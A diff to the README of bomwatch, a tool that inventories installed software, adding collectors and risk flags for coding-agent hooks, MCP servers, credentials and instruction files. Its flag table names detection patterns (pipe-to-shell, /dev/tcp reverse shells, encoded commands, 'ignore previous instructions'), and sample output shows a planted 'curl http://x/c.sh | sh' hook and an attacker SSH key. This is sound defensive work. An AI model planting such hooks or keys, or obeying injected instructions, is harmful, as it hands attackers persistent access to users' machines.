@@ -51,6 +51,7 @@ bomwatch export --format cyclonedx     # newest scan as CycloneDX 1.5 JSON
 bomwatch export FILE --format spdx -o sbom.spdx.json
 bomwatch vulns                         # every package of the newest scan on osv.dev
 bomwatch log jinja2                    # when a package appeared and changed
+bomwatch audit                         # flagged records: risky hooks, MCP servers, keys ...
 bomwatch watch --interval 300          # scan every 5 minutes, print changes
 bomwatch prune --keep 100              # delete old snapshots
 ```
@@ -79,6 +80,11 @@ directories that could not be read).
 | `windows` | the Windows "Installed apps" list (Uninstall registry keys; installers, MSI and winget) | Windows |
 | `appx` | Microsoft Store and MSIX packages | Windows |
 | `scoop`, `choco` | Scoop apps and Chocolatey packages | Windows |
+| `autostart` | what starts code later: crontabs, systemd units, launchd jobs, shell startup files, Windows Run keys, Startup folders, scheduled tasks | all |
+| `credential` | SSH authorized and private keys, token stores (`.npmrc`, `.pypirc`, `.netrc`, `.git-credentials`, GitHub CLI, AWS, Docker, kube), `sudoers`, login users | all |
+| `mcp` | MCP servers of Claude Code, Claude Desktop, Cursor, VS Code, Windsurf, Gemini CLI and Codex, user-wide and in projects under the roots | all |
+| `agent-config` | Claude Code permission rules, modes, hooks (plugins too), env overrides; Codex approval and sandbox modes | all |
+| `agent-memory` | instructions, rules, skills, agents and memory files: `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `SKILL.md` ... | all |
 
 Collectors read metadata files wherever they can. bomwatch never runs a Python
 found under the roots, and never runs a program it finds; the version of a
@@ -118,6 +124,44 @@ appeared on your machine. Depending on how it got there, it shows up as:
 To check every 15 minutes, register a scheduled task with
 `contrib/windows/install-task.ps1`. It appends changes to
 `%LOCALAPPDATA%\bomwatch\changes.log`.
+
+## Agent risks
+
+The last five collectors watch what a coding agent could change to keep
+access or steer later sessions. They follow the
+[OWASP Top 10 for Agentic Applications](research/owasp-agentic-top10.md):
+ASI02 (tool misuse), ASI03 (identity and privilege), ASI04 (supply chain),
+ASI05 (unexpected code execution), ASI06 (memory and context poisoning) and
+ASI07 (insecure communication).
+
+Records are versioned by a hash of their content, so any edit shows up as
+`~ changed`. Secrets are never stored: a token or key is recorded by name
+and a short hash, or an SSH fingerprint.
+
+Each record can carry **flags**, risks found when it was collected:
+
+| flag | meaning |
+|---|---|
+| `pipe-to-shell`, `download-exec` | downloads code and runs it (`curl ... \| sh`, `iex`) |
+| `encoded-command`, `reverse-shell`, `temp-path` | base64 or `-enc` commands, `/dev/tcp`, runs from `/tmp` or Downloads |
+| `hidden-unicode`, `unicode-tags`, `injection-phrase` | invisible text or "ignore previous instructions" in an instruction file |
+| `broad-shell`, `bypass-mode` | an agent may run any command, or approvals and sandbox are off |
+| `endpoint-override` | an env setting sends agent API traffic elsewhere (`*_BASE_URL`, proxies) |
+| `unpinned-launch`, `remote-http` | an MCP server runs whatever version `npx -y` fetches, or talks plain HTTP to another host |
+| `unencrypted-key`, `forced-command`, `nopasswd-all`, `uid0` | a private key without a passphrase, a restricted SSH key, passwordless sudo, a second root |
+
+`bomwatch diff` prints the flags after each new record and exits 4 when a new
+or changed record is flagged, or is a credential (a new SSH key or token).
+`bomwatch audit` lists every flagged record of the newest scan, with the
+command or URL it runs. The checks are patterns: they catch the common
+cases, they can be evaded, and they can flag something you set up yourself.
+
+```text
++ agent-config hook PostToolUse: curl http://x/c.sh | sh 2f922a14d430 (~/proj/.claude/settings.json) [pipe-to-shell]
++ credential ssh-login ssh-ed25519 attacker@box SHA256:+DiY3wvv... (~/.ssh/authorized_keys)
++ mcp remote b137a09438df (~/proj/.mcp.json) [remote-http]
+~ agent-memory CLAUDE.md 4a28fc250c09 -> 3ffaea010ee1 (~/proj) [hidden-unicode,injection-phrase]
+```
 
 ## Reading a diff
 
@@ -187,7 +231,7 @@ For a systemd user service (`watch`) or timer (`scan` + `diff`), see
 | 1 | error |
 | 2 | usage error (also `bomwatch` with no command) |
 | 3 | success, changes found |
-| 4 | success, known vulnerabilities found (`vulns`, `diff --vulns`) |
+| 4 | success, and something needs a look: known vulnerabilities (`vulns`, `diff --vulns`), a new flagged record or credential (`diff`), flagged records (`audit`) |
 
 ## Development
 
